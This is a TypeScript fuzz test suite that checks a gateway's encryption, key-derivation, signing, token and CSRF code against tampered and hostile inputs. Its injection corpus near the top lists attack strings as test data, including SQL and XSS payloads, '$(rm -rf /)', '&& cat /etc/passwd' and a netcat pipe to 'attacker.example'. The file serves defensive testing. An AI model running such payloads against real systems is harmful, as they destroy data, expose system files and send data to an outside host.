import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import type { Request, Response } from "express";
import { check, gen, type Rng } from "../lib/proptest";

import { aesGcmSeal, aesGcmOpen } from "../lib/crypto-aes-gcm";
import {
  deriveKey,
  deriveKeyCached,
  decodeKey32,
  fingerprint,
  constantTimeEqual,
} from "../lib/crypto-keys";
import {
  sealConfig,
  openConfig,
  readMaybeSealed,
  isSealedConfig,
  exportConfigBundle,
  openBundle,
  __resetConfigCrypto,
} from "../lib/config-crypto";
import {
  mintMagicToken,
  verifyMagicToken,
  isValidEmail,
  consumeMagicToken,
} from "../lib/magic-link";
import { csrfGuard, newCsrfToken } from "../lib/csrf";
import { deriveSessionBrokerKey, sessionBindFromSession } from "../lib/session-key";
import { parsePrivateKey, verifySignature } from "../lib/signing";

// api-token reads API_TOKENS at module load, so set it BEFORE importing (dynamic import).
process.env["API_TOKENS"] = "ro-token-aaaaaaaaaaaaaaaa,ro-token-bbbbbbbbbbbbbbbb";
const API_TOKEN_VALUES = ["ro-token-aaaaaaaaaaaaaaaa", "ro-token-bbbbbbbbbbbbbbbb"];
const { hasValidApiToken } = await import("../lib/api-token");

/**
 * CRYPTO / CODEC FUZZ suite — a sibling of fuzz-injection.test.ts, aimed at the gateway's
 * authenticated-encryption, key-derivation, signing and token-comparison primitives. It feeds
 * the SAME hostile corpus (SQL / JS-XSS / template / prototype-pollution / shell / path-traversal
 * payloads plus randomised nasty strings), plus empty / unicode / huge payloads, through each
 * codec and asserts the security invariants they rest on:
 *
 *   · ROUND-TRIP        open(seal(x)) === x (verify(mint(x)) validates) for ANY payload.
 *   · TAMPER-REJECTION  mutating any byte of a sealed/signed token makes open/verify return
 *                       null/false — NEVER a forged accept — and NEVER throws. (base64url final
 *                       char has unused low bits, so a flip there can be a genuine no-op; we
 *                       exclude it and flip only positions that always change a decoded byte —
 *                       see fuzz-injection.test.ts.)
 *   · GARBAGE-IN        open/verify/parse on arbitrary hostile strings returns null/false or a
 *                       controlled typed error — never an uncaught non-Error, never a crash.
 *   · DETERMINISM /     a KDF is stable for the same input and its output changes when the
 *     DOMAIN SEP        domain-separation label / secret changes.
 *
 * Deterministic (seeded PRNG); a failure prints PROPTEST_SEED=<n> to replay the exact input.
 */

// ── The injection corpus (identical spirit to fuzz-injection.test.ts) ─────────────
const INJECTION: readonly string[] = [
  "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT password FROM users",
  "<script>alert(1)</script>", "javascript:alert(document.cookie)", "${process.env.SESSION_SECRET}",
  "{{constructor.constructor('return process')()}}", "`${7*7}`", "{{7*7}}", "#{7*7}", "%{7*7}",
  "$(rm -rf /)", "; ls -la /", "&& cat /etc/passwd", "| nc attacker.example 4444", "`whoami`",
  "__proto__", "constructor", "prototype", "__proto__.polluted",
  "../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", " ", "/ok\r\nSet-Cookie: x=1",
  "file:///etc/passwd", "‮", "{{ $env.SESSION_SECRET }}", "$json.body.payload.__proto__.x",
];

const NASTY_ALPHABET = "ab12'\"`{}$();<>\\/-. \n\t=&|:@#%";
const UNICODE = ["café", "☃", "𝕏", "🎉🎉", "日本語テキスト", "a\x00b", "﻿bom", "é́", "tab\ttab"];

/** A generated payload: corpus, random nasty string, unicode, empty, huge, or a splice. */
function payload(r: Rng): string {
  const roll = gen.int(r, 0, 5);
  switch (roll) {
    case 0: return gen.pick(r, INJECTION);
    case 1: return gen.string(r, NASTY_ALPHABET, 48);
    case 2: return gen.pick(r, UNICODE);
    case 3: return ""; // empty
    case 4: return (gen.pick(r, INJECTION) + gen.pick(r, UNICODE)).repeat(gen.int(r, 200, 600)); // huge
    default: return gen.pick(r, INJECTION) + gen.string(r, NASTY_ALPHABET, 32);
  }
}

/** An arbitrary hostile string (never a well-formed token) for garbage-in tests. */
function evil(r: Rng): string {
  const roll = gen.int(r, 0, 3);
  if (roll === 0) return gen.pick(r, INJECTION);
  if (roll === 1) return gen.string(r, NASTY_ALPHABET, 48);
  if (roll === 2) return gen.pick(r, UNICODE);
  return gen.pick(r, INJECTION) + gen.string(r, NASTY_ALPHABET, 32);
}

const B64URL = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
const HEX = "0123456789abcdef";

/** Flip ONE character of `s` at a random index in [lo, hi] to a DIFFERENT char of `alphabet`. */
function flipChar(r: Rng, s: string, lo: number, hi: number, alphabet: string): string {
  const i = gen.int(r, lo, hi);
  let repl = gen.pick(r, alphabet.split(""));
  if (repl === s[i]) repl = repl === "A" ? "B" : "A";
  return s.slice(0, i) + repl + s.slice(i + 1);
}

/** Flip one char of a base64url body EXCLUDING the final char (its low bits are unused, so a
 *  flip there can decode to identical bytes — a genuine no-op, not a tamper). Every other
 *  position always changes ≥1 decoded byte, so the auth tag must reject it. `lo` lets callers
 *  skip a non-secret prefix (e.g. "v2." / "c1.<ver>."). */
function tamperBody(r: Rng, token: string, lo = 0): string {
  return flipChar(r, token, lo, token.length - 2, B64URL);
}

// ════════════════════════════════════════════════════════════════════════════════
// 1. crypto-aes-gcm — the shared AES-256-GCM seal/open primitive
// ════════════════════════════════════════════════════════════════════════════════
const KEY = crypto.randomBytes(32);
const OTHER_KEY = crypto.randomBytes(32);

test("fuzz: aesGcmOpen(aesGcmSeal(x)) === x for ANY payload (injection / empty / unicode / huge)", () => {
  check(
    (r) => payload(r),
    (x) => {
      const sealed = aesGcmSeal(x, KEY);
      assert.equal(typeof sealed, "string");
      assert.equal(aesGcmOpen(sealed, KEY), x);
    },
    { runs: 400 },
  );
});

test("fuzz: aesGcmOpen rejects every tampered byte with null — never throws, never forges", () => {
  check(
    (r) => ({ tampered: tamperBody(r, aesGcmSeal(payload(r), KEY)), x: "" }),
    ({ tampered }) => {
      let out: string | null = "sentinel";
      assert.doesNotThrow(() => { out = aesGcmOpen(tampered, KEY); });
      assert.equal(out, null, "a tampered GCM token must open to null (auth-tag failure)");
    },
    { runs: 400 },
  );
});

test("fuzz: aesGcmOpen under the WRONG key is null, never the plaintext", () => {
  check(
    (r) => payload(r),
    (x) => {
      assert.equal(aesGcmOpen(aesGcmSeal(x, KEY), OTHER_KEY), null);
    },
    { runs: 300 },
  );
});

test("fuzz: aesGcmOpen on arbitrary hostile / short / non-base64 strings returns null, never throws", () => {
  check(
    (r) => evil(r),
    (s) => {
      let out: string | null = "sentinel";
      assert.doesNotThrow(() => { out = aesGcmOpen(s, KEY); });
      // Whatever comes back must be null or a string (never a thrown non-Error / object).
      assert.ok(out === null || typeof out === "string");
    },
    { runs: 400 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 2. crypto-keys — deriveKey / deriveKeyCached / decodeKey32 / fingerprint / constantTimeEqual
// ════════════════════════════════════════════════════════════════════════════════
const HKDF_SALT = Buffer.from("omniproject/hkdf/v1");
// Alphabet DELIBERATELY includes a space: deriveKey now length-prefixes `info` in its cache key
// (`${info.length}:${info}${secret}`), so a space in either arg can no longer make ("z","x y")
// collide with ("y z","x"). Fuzzing space-bearing inputs exercises that fix directly.
const KDF_ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.:- ";

test("fuzz: deriveKey is a stable, correct 32-byte HKDF and is domain-separated by `info`", () => {
  check(
    (r) => ({
      secret: gen.string(r, KDF_ALPHABET, 40) || "s",
      info: gen.string(r, KDF_ALPHABET, 20) || "i",
      info2: gen.string(r, KDF_ALPHABET, 20) || "j",
    }),
    ({ secret, info, info2 }) => {
      const k = deriveKey(secret, info);
      assert.equal(k.length, 32);
      // Deterministic: same input → identical bytes.
      assert.ok(k.equals(deriveKey(secret, info)));
      // Correct: equals a raw HKDF-SHA256 recomputation.
      assert.ok(k.equals(Buffer.from(crypto.hkdfSync("sha256", secret, HKDF_SALT, info, 32))));
      // Domain separation: a different `info` yields an independent key.
      if (info !== info2) assert.ok(!k.equals(deriveKey(secret, info2)), "info did not domain-separate");
    },
    { runs: 400 },
  );
});

test("fuzz: deriveKeyCached is a stable 32-byte key that changes with the secret", () => {
  check(
    (r) => ({ a: payload(r), b: payload(r) }),
    ({ a, b }) => {
      const ka = deriveKeyCached(a);
      assert.equal(ka.length, 32);
      assert.ok(ka.equals(deriveKeyCached(a)), "not deterministic");
      assert.ok(ka.equals(crypto.createHash("sha256").update(a).digest()));
      if (a !== b) assert.ok(!ka.equals(deriveKeyCached(b)), "distinct secrets collided");
    },
    { runs: 300 },
  );
});

test("fuzz: decodeKey32 returns a 32-byte buffer only for 32-byte input, else null; never throws", () => {
  check(
    (r) => (gen.bool(r) ? crypto.randomBytes(32).toString("base64") : evil(r)),
    (b64) => {
      let out: Buffer | null = null;
      assert.doesNotThrow(() => { out = decodeKey32(b64); });
      if (out !== null) assert.equal((out as Buffer).length, 32);
    },
    { runs: 400 },
  );
});

test("fuzz: fingerprint is a stable hex string of the requested length; never throws", () => {
  check(
    (r) => ({ v: payload(r), len: gen.int(r, 1, 32) }),
    ({ v, len }) => {
      const fp = fingerprint(v, len);
      assert.equal(fp, fingerprint(v, len), "not deterministic");
      assert.equal(fp.length, len);
      assert.ok(/^[0-9a-f]*$/.test(fp), "not lowercase hex");
    },
    { runs: 300 },
  );
});

test("fuzz: constantTimeEqual is true iff strings are equal; never throws on any pair", () => {
  check(
    (r) => {
      const a = payload(r);
      // Half the time compare against an equal copy, half against a (usually different) other.
      const b = gen.bool(r) ? a : payload(r);
      return { a, b };
    },
    ({ a, b }) => {
      let out = false;
      assert.doesNotThrow(() => { out = constantTimeEqual(a, b); });
      assert.equal(out, Buffer.byteLength(a) === Buffer.byteLength(b) && a === b);
      // Dropping the first char of any non-empty string must never still compare equal.
      if (a.length > 0) assert.equal(constantTimeEqual(a, a.slice(1)), false);
    },
    { runs: 400 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 3. config-crypto — versioned config-at-rest seal + ephemeral export bundle
// ════════════════════════════════════════════════════════════════════════════════
test("fuzz: sealConfig/openConfig round-trips ANY payload; readMaybeSealed + isSealedConfig agree", () => {
  __resetConfigCrypto();
  check(
    (r) => payload(r),
    (x) => {
      const sealed = sealConfig(x);
      assert.ok(sealed.startsWith("c1."));
      assert.equal(isSealedConfig(sealed), true);
      assert.equal(openConfig(sealed), x);
      assert.equal(readMaybeSealed(sealed), x);
    },
    { runs: 300 },
  );
});

test("fuzz: openConfig rejects a tampered ciphertext body with null — never throws, never forges", () => {
  __resetConfigCrypto();
  check(
    (r) => {
      const sealed = sealConfig(payload(r)); // c1.<ver>.<base64url body>
      // Tamper only WITHIN the ciphertext body (after the version dot) so we exercise the auth
      // tag, not the version parser; exclude the final char (unused low bits).
      const bodyStart = sealed.indexOf(".", 3) + 1;
      return tamperBody(r, sealed, bodyStart);
    },
    (tampered) => {
      let out: string | null = "sentinel";
      assert.doesNotThrow(() => { out = openConfig(tampered); });
      assert.equal(out, null, "a tampered config token must open to null");
    },
    { runs: 300 },
  );
});

test("fuzz: openConfig / readMaybeSealed on arbitrary non-tokens never throw", () => {
  __resetConfigCrypto();
  check(
    (r) => evil(r),
    (s) => {
      let a: string | null = null;
      let b = "";
      assert.doesNotThrow(() => { a = openConfig(s); });
      assert.doesNotThrow(() => { b = readMaybeSealed(s); });
      assert.ok(a === null || typeof a === "string");
      // A non-"c1." string passes through readMaybeSealed unchanged.
      if (!s.startsWith("c1.")) assert.equal(b, s);
    },
    { runs: 300 },
  );
});

test("fuzz: exportConfigBundle → openBundle round-trips under the ephemeral key; wrong key ⇒ null", () => {
  __resetConfigCrypto();
  check(
    (r) => payload(r),
    (x) => {
      const { bundle, exportKey } = exportConfigBundle(x);
      assert.ok(bundle.startsWith("e1."));
      assert.equal(openBundle(bundle, exportKey), x);
      // A different ephemeral key of the right size must not open it.
      assert.equal(openBundle(bundle, crypto.randomBytes(32).toString("base64")), null);
      // A wrong-length key is rejected outright (null), not thrown.
      assert.equal(openBundle(bundle, crypto.randomBytes(16).toString("base64")), null);
    },
    { runs: 200 },
  );
});

test("fuzz: openBundle on hostile bundle/key inputs never throws", () => {
  __resetConfigCrypto();
  check(
    (r) => ({ bundle: gen.bool(r) ? "e1." + evil(r) : evil(r), key: evil(r) }),
    ({ bundle, key }) => {
      let out: string | null = null;
      assert.doesNotThrow(() => { out = openBundle(bundle, key); });
      assert.ok(out === null || typeof out === "string");
    },
    { runs: 300 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 4. magic-link — sealed, single-use, time-boxed sign-in token
// ════════════════════════════════════════════════════════════════════════════════
const NOW = 1_700_000_000_000;

test("fuzz: verifyMagicToken(mintMagicToken(email)) returns the normalised email + jti for ANY email", () => {
  check(
    (r) => payload(r),
    (email) => {
      const token = mintMagicToken(email, NOW);
      const v = verifyMagicToken(token, NOW);
      assert.ok(v, "a freshly-minted, unexpired token must verify");
      assert.equal(v!.email, email.trim().toLowerCase());
      assert.equal(typeof v!.jti, "string");
    },
    { runs: 300 },
  );
});

test("fuzz: an expired magic token verifies to null (exp <= now)", () => {
  check(
    (r) => payload(r),
    (email) => {
      const token = mintMagicToken(email, NOW);
      // ttl is 15 min by default; verifying well past exp must fail.
      assert.equal(verifyMagicToken(token, NOW + 60 * 60 * 1000), null);
    },
    { runs: 200 },
  );
});

test("fuzz: a tampered magic token verifies to null — never throws, never forges an identity", () => {
  check(
    (r) => tamperBody(r, mintMagicToken(payload(r), NOW), 3 /* skip the "v2." session prefix */),
    (tampered) => {
      let v: unknown = "sentinel";
      assert.doesNotThrow(() => { v = verifyMagicToken(tampered as string, NOW); });
      assert.equal(v, null, "a tampered magic token must verify to null");
    },
    { runs: 300 },
  );
});

test("fuzz: verifyMagicToken on arbitrary hostile strings returns null, never throws", () => {
  check(
    (r) => evil(r),
    (s) => {
      let v: unknown = "sentinel";
      assert.doesNotThrow(() => { v = verifyMagicToken(s, NOW); });
      assert.equal(v, null);
    },
    { runs: 300 },
  );
});

test("fuzz: isValidEmail never throws and rejects control chars / spaces / >254-char inputs", () => {
  check(
    (r) => evil(r),
    (s) => {
      let ok = false;
      assert.doesNotThrow(() => { ok = isValidEmail(s); });
      if (ok) {
        // Anything it ACCEPTS must satisfy the shape it claims to enforce.
        const t = s.trim();
        assert.ok(t.length <= 254);
        assert.ok(!/\s/.test(t), "accepted an address with whitespace");
        assert.ok(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(t));
      }
    },
    { runs: 300 },
  );
});

test("magic-link: isValidEmail accepts ordinary addresses and rejects obvious non-emails", () => {
  for (const good of ["a@b.co", "user.name@example.com", "x+y@sub.domain.org"]) {
    assert.equal(isValidEmail(good), true, good);
  }
  for (const bad of ["", " ", "no-at-sign", "a@b", "a@@b.com", "a b@c.com", "a@b .com", "x".repeat(250) + "@example.com"]) {
    assert.equal(isValidEmail(bad), false, bad);
  }
});

test("magic-link: consumeMagicToken is single-use — first jti wins, replay is rejected", async () => {
  for (const jti of ["jti-alpha", "jti-beta", "jti-🎉", "jti-'; DROP--"]) {
    assert.equal(await consumeMagicToken(jti), true, "first use must succeed");
    assert.equal(await consumeMagicToken(jti), false, "replay must be rejected");
  }
});

// ════════════════════════════════════════════════════════════════════════════════
// 5. api-token — read-only bearer token comparison (constant-time)
// ════════════════════════════════════════════════════════════════════════════════
function reqWith(headers: Record<string, string>): Request {
  return { headers } as unknown as Request;
}

test("fuzz: hasValidApiToken accepts a configured token (via X-API-Key or Bearer), rejects everything else", () => {
  check(
    (r) => {
      const valid = gen.pick(r, API_TOKEN_VALUES);
      const useValid = gen.bool(r);
      const presented = useValid ? valid : evil(r);
      const viaBearer = gen.bool(r);
      const headers: Record<string, string> = viaBearer
        ? { authorization: `Bearer ${presented}` }
        : { "x-api-key": presented };
      return { headers, expect: useValid && API_TOKEN_VALUES.includes(presented) };
    },
    ({ headers, expect }) => {
      let ok = false;
      assert.doesNotThrow(() => { ok = hasValidApiToken(reqWith(headers)); });
      assert.equal(ok, expect);
    },
    { runs: 400 },
  );
});

test("fuzz: a one-char mutation of a valid API token is never accepted", () => {
  check(
    (r) => {
      const valid = gen.pick(r, API_TOKEN_VALUES);
      const i = gen.int(r, 0, valid.length - 1);
      const repl = valid[i] === "a" ? "b" : "a";
      return valid.slice(0, i) + repl + valid.slice(i + 1);
    },
    (mutated) => {
      assert.equal(hasValidApiToken(reqWith({ authorization: `Bearer ${mutated}` })), false);
      assert.equal(hasValidApiToken(reqWith({ "x-api-key": mutated })), false);
    },
    { runs: 300 },
  );
});

test("fuzz: hasValidApiToken never throws on hostile / missing / malformed headers", () => {
  check(
    (r) => {
      const roll = gen.int(r, 0, 3);
      if (roll === 0) return {} as Record<string, string>;
      if (roll === 1) return { authorization: evil(r) };
      if (roll === 2) return { "x-api-key": evil(r) };
      return { authorization: `Bearer ${evil(r)}`, "x-api-key": evil(r) };
    },
    (headers) => {
      let ok = true;
      assert.doesNotThrow(() => { ok = hasValidApiToken(reqWith(headers)); });
      assert.equal(typeof ok, "boolean");
    },
    { runs: 400 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 6. signing — Ed25519 sign / verify (non-repudiation over the audit anchor)
// ════════════════════════════════════════════════════════════════════════════════
const kp = crypto.generateKeyPairSync("ed25519");
const SIGN_PRIVATE_PEM = kp.privateKey.export({ format: "pem", type: "pkcs8" }).toString();
const SIGN_PUBLIC_PEM = kp.publicKey.export({ format: "pem", type: "spki" }).toString();
const OTHER_PUBLIC_PEM = crypto.generateKeyPairSync("ed25519").publicKey.export({ format: "pem", type: "spki" }).toString();

test("signing: parsePrivateKey accepts PEM / base64 DER / base64 seed, rejects garbage without throwing", () => {
  const der = kp.privateKey.export({ format: "der", type: "pkcs8" }).toString("base64");
  const seed = Buffer.from(kp.privateKey.export({ format: "jwk" }).d!, "base64url").toString("base64");
  for (const raw of [SIGN_PRIVATE_PEM, der, seed]) {
    const k = parsePrivateKey(raw);
    assert.ok(k, "expected a parsed key");
    assert.equal(
      crypto.createPublicKey(k!).export({ format: "pem", type: "spki" }).toString(),
      SIGN_PUBLIC_PEM,
    );
  }
});

test("fuzz: parsePrivateKey returns null (never throws) on arbitrary hostile input", () => {
  check(
    (r) => evil(r),
    (s) => {
      let k: unknown = "sentinel";
      assert.doesNotThrow(() => { k = parsePrivateKey(s); });
      assert.ok(k === null || (typeof k === "object" && k !== null));
    },
    { runs: 300 },
  );
});

test("fuzz: verifySignature accepts a genuine Ed25519 signature over ANY message, rejects tamper", () => {
  const priv = parsePrivateKey(SIGN_PRIVATE_PEM)!;
  check(
    (r) => payload(r),
    (msg) => {
      const sig = crypto.sign(null, Buffer.from(msg), priv).toString("base64");
      // Genuine signature verifies.
      assert.equal(verifySignature(msg, sig, SIGN_PUBLIC_PEM), true);
      // Wrong public key rejects.
      assert.equal(verifySignature(msg, sig, OTHER_PUBLIC_PEM), false);
      // A different message under the same signature rejects.
      assert.equal(verifySignature(msg + "x", sig, SIGN_PUBLIC_PEM), false);
      // A flipped signature BYTE rejects (flip on the decoded bytes to dodge base64 padding no-ops).
      const raw = Buffer.from(sig, "base64");
      raw[0] = (raw[0] ?? 0) ^ 0x01;
      assert.equal(verifySignature(msg, raw.toString("base64"), SIGN_PUBLIC_PEM), false);
    },
    { runs: 300 },
  );
});

test("fuzz: verifySignature on hostile (message, signature, key) triples returns false, never throws", () => {
  check(
    (r) => ({ msg: evil(r), sig: evil(r), key: gen.bool(r) ? SIGN_PUBLIC_PEM : evil(r) }),
    ({ msg, sig, key }) => {
      let ok = true;
      assert.doesNotThrow(() => { ok = verifySignature(msg, sig, key); });
      assert.equal(ok, false);
    },
    { runs: 400 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 7. csrf — token minting + the double-submit guard
// ════════════════════════════════════════════════════════════════════════════════
test("fuzz: newCsrfToken is a fresh 48-char hex string every call", () => {
  const seen = new Set<string>();
  check(
    () => newCsrfToken(),
    (tok) => {
      assert.ok(/^[0-9a-f]{48}$/.test(tok), `not 48 hex: ${tok}`);
      assert.ok(!seen.has(tok), "CSRF token repeated");
      seen.add(tok);
    },
    { runs: 500 },
  );
});

function runGuard(opts: {
  method?: string; session?: boolean; origin?: string;
  csrfCookie?: string | undefined; csrfHeader?: string | undefined; secFetch?: string;
}): { status: number | null; passed: boolean } {
  const host = "app.example.com";
  const headers: Record<string, string> = { host };
  if (opts.origin) headers["origin"] = opts.origin;
  if (opts.secFetch) headers["sec-fetch-site"] = opts.secFetch;
  if (opts.csrfHeader !== undefined) headers["x-csrf-token"] = opts.csrfHeader;
  const req = {
    method: opts.method ?? "POST",
    path: "/api/issues",
    protocol: "https",
    headers,
    signedCookies: opts.session ? { omni_session: "s:sess" } : {},
    cookies: opts.csrfCookie !== undefined ? { omni_csrf: opts.csrfCookie } : {},
    get(name: string) { return headers[name.toLowerCase()]; },
  } as unknown as Request;
  let status: number | null = null;
  let passed = false;
  const res = {
    status(code: number) { status = code; return this; },
    json() { return this; },
  } as unknown as Response;
  csrfGuard(req, res, () => { passed = true; });
  return { status, passed };
}

test("fuzz: csrfGuard only passes a same-origin request whose CSRF header EQUALS its cookie", () => {
  check(
    (r) => {
      const token = newCsrfToken();
      const roll = gen.int(r, 0, 3);
      // 0: matching pair (should pass) · 1: mismatched header (tamper) · 2: missing header · 3: missing cookie
      if (roll === 0) return { token, cookie: token, header: token, expectPass: true };
      if (roll === 1) return { token, cookie: token, header: gen.bool(r) ? newCsrfToken() : evil(r), expectPass: false };
      if (roll === 2) return { token, cookie: token, header: undefined as string | undefined, expectPass: false };
      return { token, cookie: undefined as string | undefined, header: token, expectPass: false };
    },
    ({ cookie, header, expectPass }) => {
      let out: { status: number | null; passed: boolean } = { status: null, passed: false };
      assert.doesNotThrow(() => {
        out = runGuard({ session: true, origin: "https://app.example.com", csrfCookie: cookie, csrfHeader: header });
      });
      if (expectPass) {
        assert.equal(out.passed, true, "a matching same-origin double-submit must pass");
      } else {
        assert.equal(out.passed, false, "a mismatched/absent CSRF token must be blocked");
        assert.equal(out.status, 403);
      }
    },
    { runs: 400 },
  );
});

test("fuzz: csrfGuard rejects a cross-origin session mutation regardless of token", () => {
  check(
    (r) => ({ token: newCsrfToken(), evilOrigin: gen.bool(r) ? "https://attacker.example" : "https://" + gen.string(r, "abcdefg.", 12) }),
    ({ token, evilOrigin }) => {
      const out = runGuard({ session: true, origin: evilOrigin, csrfCookie: token, csrfHeader: token });
      assert.equal(out.passed, false, "cross-origin must never pass");
      assert.equal(out.status, 403);
    },
    { runs: 300 },
  );
});

// ════════════════════════════════════════════════════════════════════════════════
// 8. session-key — per-session broker signing key derivation
// ════════════════════════════════════════════════════════════════════════════════
test("fuzz: deriveSessionBrokerKey is deterministic (64-hex) and separates by sub / smono / salt", () => {
  check(
    (r) => ({
      sub: payload(r),
      smono: gen.string(r, "0123456789", 18) || "0",
      salt: crypto.randomBytes(8).toString("hex"),
      salt2: crypto.randomBytes(8).toString("hex"),
    }),
    ({ sub, smono, salt, salt2 }) => {
      const k = deriveSessionBrokerKey({ sub, smono, salt });
      assert.ok(/^[0-9a-f]{64}$/.test(k), "not 64-hex");
      // Deterministic for identical binding material.
      assert.equal(k, deriveSessionBrokerKey({ sub, smono, salt }));
      // Any change in the binding material yields a different key.
      if (salt !== salt2) assert.notEqual(k, deriveSessionBrokerKey({ sub, smono, salt: salt2 }));
      assert.notEqual(k, deriveSessionBrokerKey({ sub: sub + "x", smono, salt }));
      assert.notEqual(k, deriveSessionBrokerKey({ sub, smono: smono + "9", salt }));
    },
    { runs: 300 },
  );
});

test("fuzz: sessionBindFromSession returns bind only when sub/smono/salt are all present", () => {
  check(
    (r) => ({
      sub: gen.bool(r) ? payload(r) : "",
      smono: gen.bool(r) ? gen.string(r, "0123456789", 12) : "",
      salt: gen.bool(r) ? crypto.randomBytes(4).toString("hex") : "",
    }),
    ({ sub, smono, salt }) => {
      const bind = sessionBindFromSession({ sub, smono, salt });
      if (sub && smono && salt) {
        assert.ok(bind);
        assert.deepEqual(bind, { sub, smono, salt });
      } else {
        assert.equal(bind, null);
      }
      assert.equal(sessionBindFromSession(null), null);
      assert.equal(sessionBindFromSession(undefined), null);
    },
    { runs: 300 },
  );
});
